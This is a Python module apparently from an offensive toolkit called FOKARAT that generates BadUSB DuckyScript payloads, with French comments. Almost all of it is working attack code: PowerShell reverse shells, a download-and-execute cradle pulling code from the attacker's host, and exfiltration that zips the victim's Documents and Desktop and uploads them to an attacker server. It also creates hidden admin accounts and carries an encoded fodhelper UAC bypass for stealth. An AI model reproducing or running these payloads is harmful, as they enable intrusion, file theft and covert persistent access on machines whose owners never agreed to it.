"""
FOKARAT - BadUSB Generator v3.0
Génère des scripts DuckyScript professionnels avec choix complets.
"""
import os
import base64
from core.module_interface import ModuleInterface
from core.logger import Logger
from core.utils import ensure_dir, safe_input

logger = Logger()


# Layouts clavier supportés
KEYBOARD_LAYOUTS = {
    "1": ("us", "QWERTY (US)"),
    "2": ("fr", "AZERTY (France)"),
    "3": ("de", "QWERTZ (Allemagne)"),
    "4": ("ch", "QWERTZ (Suisse)"),
    "5": ("uk", "QWERTY (UK)"),
}

# Types d'attaque disponibles
ATTACK_TYPES = {
    "1": "Reverse Shell (Metasploit)",
    "2": "Reverse Shell (PowerShell direct)",
    "3": "Vol de fichiers (exfiltration HTTP)",
    "4": "Ajout utilisateur admin caché",
    "5": "Téléchargement + exécution d'un .exe",
}


class BadUSBGenerator(ModuleInterface):
    def get_metadata(self):
        return {
            "name": "BadUSB Generator",
            "version": "3.0",
            "type": "injector",
            "description": "Générateur DuckyScript complet (Reverse Shell, Exfiltration, Admin)."
        }

    def run(self, config):
        print("\n  ╔══════════════════════════════════════╗")
        print("  ║     FOKARAT BadUSB Generator v3.0    ║")
        print("  ╚══════════════════════════════════════╝\n")

        # 1. Choix du type d'attaque
        print("  Type d'attaque :")
        for k, v in ATTACK_TYPES.items():
            print(f"    [{k}] {v}")
        attack = safe_input("  [>] Choix [1] : ") or "1"

        # 2. Choix du layout clavier
        print("\n  Layout clavier cible :")
        for k, (_, name) in KEYBOARD_LAYOUTS.items():
            print(f"    [{k}] {name}")
        layout = safe_input("  [>] Choix [1] : ") or "1"
        layout_code = KEYBOARD_LAYOUTS.get(layout, ("us", "QWERTY"))[0]

        # 3. Choix du mode (simple / furtif)
        mode = safe_input("\n  [>] Mode furtif (UAC Bypass) ? (o/n) [n] : ").lower() or "n"
        stealth = mode == "o"

        # 4. Récupération LHOST/LPORT
        lhost, lport = self._ask_lhost_lport(config)

        # 5. Génération selon le type
        if attack == "1":
            ducky = self._gen_reverse_msf(lhost, lport, stealth)
            ps1 = self._gen_ps1_reverse_msf(lhost, lport)
        elif attack == "2":
            ducky = self._gen_reverse_direct(lhost, lport, stealth)
            ps1 = None
        elif attack == "3":
            exfil_host = safe_input("  [>] IP de votre serveur d'exfiltration : ").strip()
            ducky = self._gen_exfil(lhost, exfil_host, stealth)
            ps1 = None
        elif attack == "4":
            username = safe_input("  [>] Nom d'utilisateur à créer [fokarat] : ").strip() or "fokarat"
            password = safe_input("  [>] Mot de passe [F0k@rat2025!] : ").strip() or "F0k@rat2025!"
            ducky = self._gen_admin_user(username, password, stealth)
            ps1 = None
        elif attack == "5":
            url = safe_input("  [>] URL du .exe à télécharger : ").strip()
            ducky = self._gen_download_exec(url, stealth)
            ps1 = None
        else:
            logger.error("Choix invalide.")
            return {"status": "error", "message": "Choix invalide"}

        # 6. Ajout du layout clavier dans le script
        ducky = self._apply_keyboard_layout(ducky, layout_code)

        # 7. Sauvegarde
        out_dir = ensure_dir(config.get("output_dir", "output"))
        duck_path = os.path.join(out_dir, "inject.duck")
        with open(duck_path, "w", encoding="utf-8") as f:
            f.write(ducky)

        result = {
            "status": "success",
            "ducky_script": duck_path,
            "attack_type": ATTACK_TYPES.get(attack),
            "layout": layout_code,
            "stealth": stealth,
        }

        # 8. Si on a un payload.ps1 à générer
        if ps1:
            ps1_path = os.path.join(out_dir, "payload.ps1")
            with open(ps1_path, "w", encoding="utf-8") as f:
                f.write(ps1)
            result["ps1_payload"] = ps1_path
            logger.success(f"Payload PS1 : {ps1_path}")

        logger.success(f"Script Ducky généré : {duck_path}")
        logger.info(f"Type : {ATTACK_TYPES.get(attack)}")
        logger.info(f"Layout : {layout_code} | Furtif : {stealth}")

        return result

    # ============ MÉTHODES DE GÉNÉRATION ============

    def _ask_lhost_lport(self, config):
        default_ip = config.get("lhost") or "192.168.1.100"
        lhost = safe_input(f"  [>] LHOST [{default_ip}] : ") or default_ip
        config.set("lhost", lhost)

        default_port = config.get("lport", 4444)
        p = safe_input(f"  [>] LPORT [{default_port}] : ")
        try:
            lport = int(p) if p else int(default_port)
        except ValueError:
            lport = int(default_port)
        config.set("lport", lport)
        return lhost, lport

    def _apply_keyboard_layout(self, ducky, layout_code):
        """Insère la commande de layout au début du script."""
        layout_line = f"REM KEYBOARD_LAYOUT={layout_code}\n"
        if layout_code != "us":
            layout_line += f"REM Ce script suppose un clavier {layout_code.upper()}\n"
        return layout_line + ducky

    def _uac_bypass_prefix(self, stealth, ps_command, encoded=False):
        """Génère le préfixe pour contourner l'UAC ou non."""
        if not stealth:
            return f'STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_command}"'

        if encoded:
            ps_encoded = base64.b64encode(ps_command.encode("utf-16-le")).decode("utf-8")
            return (
                'STRING powershell -NoProfile -WindowStyle Hidden -Command "'
                "New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force;"
                "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' "
                "-Name 'DelegateExecute' -Value '' -Force;"
                "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' "
                f"-Name '(Default)' -Value 'powershell -EncodedCommand {ps_encoded}' -Force;"
                "Start-Process 'C:\\Windows\\System32\\fodhelper.exe'\""
            )

        return (
            'STRING powershell -NoProfile -WindowStyle Hidden -Command "'
            "New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force;"
            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' "
            "-Name 'DelegateExecute' -Value '' -Force;"
            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' "
            f"-Name '(Default)' -Value '{ps_command.replace(chr(34), chr(92)+chr(34))}' -Force;"
            "Start-Process 'C:\\Windows\\System32\\fodhelper.exe'\""
        )

    def _gen_reverse_msf(self, lhost, lport, stealth):
        """Reverse shell Metasploit via payload.ps1 téléchargé."""
        port_http = 8080
        ps_command = f"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{port_http}/payload.ps1')"
        return f'''REM FOKARAT BadUSB - Reverse Shell Metasploit
REM LHOST={lhost} LPORT={lport}
DELAY 1500
GUI r
DELAY 700
{self._uac_bypass_prefix(stealth, ps_command, encoded=stealth)}
ENTER
DELAY 5000
'''

    def _gen_reverse_direct(self, lhost, lport, stealth):
        """Reverse shell PowerShell direct (sans Metasploit)."""
        ps_command = (
            f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$r2=$r+'PS '+(pwd).Path+'> ';"
            "$sb=([text.encoding]::ASCII).GetBytes($r2);"
            "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
        )
        return f'''REM FOKARAT BadUSB - PowerShell Reverse Shell Direct
REM LHOST={lhost} LPORT={lport}
DELAY 1500
GUI r
DELAY 700
{self._uac_bypass_prefix(stealth, ps_command, encoded=stealth)}
ENTER
DELAY 5000
'''

    def _gen_exfil(self, lhost, exfil_host, stealth):
        """Vol de fichiers sensibles et exfiltration HTTP."""
        ps_command = (
            f"$f=@('$env:USERPROFILE\\Documents','$env:USERPROFILE\\Desktop');"
            f"$z=Join-Path $env:TEMP 'fokarat_exfil.zip';"
            f"Compress-Archive -Path $f -DestinationPath $z -Force;"
            f"$b=[IO.File]::ReadAllBytes($z);"
            f"$wc=New-Object Net.WebClient;"
            f"$wc.Headers.Add('X-Fokarat','exfil');"
            f"$wc.UploadFile('http://{exfil_host}:8080/upload','POST',$z);"
            f"Remove-Item $z"
        )
        return f'''REM FOKARAT BadUSB - Exfiltration de fichiers
REM Exfil vers {exfil_host}
DELAY 1500
GUI r
DELAY 700
{self._uac_bypass_prefix(stealth, ps_command, encoded=stealth)}
ENTER
DELAY 10000
'''

    def _gen_admin_user(self, username, password, stealth):
        """Crée un utilisateur administrateur caché."""
        ps_command = (
            f"net user {username} {password} /add;"
            f"net localgroup Administrateurs {username} /add 2>nul;"
            f"net localgroup Administrators {username} /add 2>nul;"
            f"reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' "
            f"/v {username} /t REG_DWORD /d 0 /f"
        )
        return f'''REM FOKARAT BadUSB - Création utilisateur admin caché
DELAY 1500
GUI r
DELAY 700
{self._uac_bypass_prefix(stealth, ps_command, encoded=stealth)}
ENTER
DELAY 3000
'''

    def _gen_download_exec(self, url, stealth):
        """Télécharge et exécute un .exe depuis une URL."""
        ps_command = (
            f"$u='{url}';$d=Join-Path $env:TEMP 'fokarat_payload.exe';"
            f"(New-Object Net.WebClient).DownloadFile($u,$d);Start-Process $d"
        )
        return f'''REM FOKARAT BadUSB - Download & Execute
REM URL={url}
DELAY 1500
GUI r
DELAY 700
{self._uac_bypass_prefix(stealth, ps_command, encoded=stealth)}
ENTER
DELAY 3000
'''

    def _gen_ps1_reverse_msf(self, lhost, lport):
        """Génère le payload.ps1 qui sera servi par le serveur HTTP."""
        return f'''# FOKARAT - Payload PS1 Reverse Shell
$LHOST = "{lhost}"
$LPORT = {lport}

$client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object {{ 0 }}

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    try {{
        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    }} catch {{
        $sendback = $_.Exception.Message
    }}
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''